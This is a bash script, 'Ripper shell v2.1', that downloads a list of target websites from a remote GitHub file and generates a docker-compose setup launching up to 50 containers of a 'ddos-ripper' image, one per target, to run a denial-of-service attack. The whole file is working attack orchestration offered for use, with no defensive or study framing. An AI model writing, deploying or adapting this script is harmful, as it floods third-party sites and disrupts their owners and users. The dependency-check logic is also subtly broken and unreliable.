#!/bin/bash
# Ripper shell v2.1
# 1.0 - initial script (uses local urls.txt file)
# 2.0 - added external mirror for url list
# 2.1 - added possibility to limit number of containers (for less powerful machines like 13in mbp pre M1)

VERSION='2.1'
TARGETS_URL='https://raw.githubusercontent.com/nitupkcuf/ripper-wrapper/main/targets.json'

function print_help {
  echo -e "Usage: os_x_ripper.sh --mode install"
  echo -e "--mode|-m   - runmode (install, reinstall, start, stop)"
  echo -e "--number|-n - number of containers to start"
}

function print_version {
  echo $VERSION
}

function check_dependencies {
  if $("docker-compose -v && jq -V && docker -v"); then
    echo "Installing dependencies"
    install_dependencies
    exit 1
  fi
}

function install_dependencies {
  apt-get update && apt-get install -y apt-transport-https ca-certificates curl software-properties-common && \
    curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add - && \
    add-apt-repository "deb [arch=amd64] https://download.docker.com/linux/ubuntu bionic stable" && \
    apt update && \
    apt install -y docker-ce && \
    curl -L "https://github.com/docker/compose/releases/download/1.29.2/docker-compose-$(uname -s)-$(uname -m)" -o /usr/local/bin/docker-compose && \
    chmod +x /usr/local/bin/docker-compose
  exit 1
}

function check_params {
  if [ -z ${mode+x} ]; then
    echo -e "Mode is unset, setting to install runmode"
    mode=install
  fi
}

function generate_compose {
    if [ -z ${amount} ]; then
        echo -e "Amount of containers not set, setting to maximum of 50"
        amount=50
    fi

    echo -e "version: '3'" > docker-compose.yml
    echo -e "services:" >> docker-compose.yml
    counter=1

    while read -r site_url; do
        if [ $counter -le $amount ]; then
            if [ ! -z $site_url ]; then
                echo -e "  ddos-runner-$counter:" >> docker-compose.yml
                echo -e "    image: nitupkcuf/ddos-ripper:latest" >> docker-compose.yml
                echo -e "    restart: always" >> docker-compose.yml
                echo -e "    command: $site_url" >> docker-compose.yml
                ((counter++))
            fi
        fi
    done < targets.txt
}

function ripper_start {
  echo "Starting ripper attack"
  docker-compose up -d
}

function ripper_stop {
  echo "Stopping ripper attack"
  docker-compose down
}

while test -n "$1"; do
  case "$1" in
  --help|-h)
    print_help
    exit
    ;;
  --mode|-m)
    mode=$2
    shift
    ;;
  --number|-n)
    amount=$2
    shift
    ;;
  *)
    echo "Unknown argument: $1"
    print_help
    exit
    ;;
  esac
  shift
done

curl --silent $TARGETS_URL | jq -r '.[]' > targets.txt

check_dependencies
check_params

case $mode in
  install)
    generate_compose
    ripper_start
    ;;
  start)
    ripper_start
    ;;
  stop)
    ripper_stop
    ;;
  reinstall)
    ripper_stop
    generate_compose
    ripper_start
    ;;
  *)
    echo "Wrong mode"
    exit 1
esac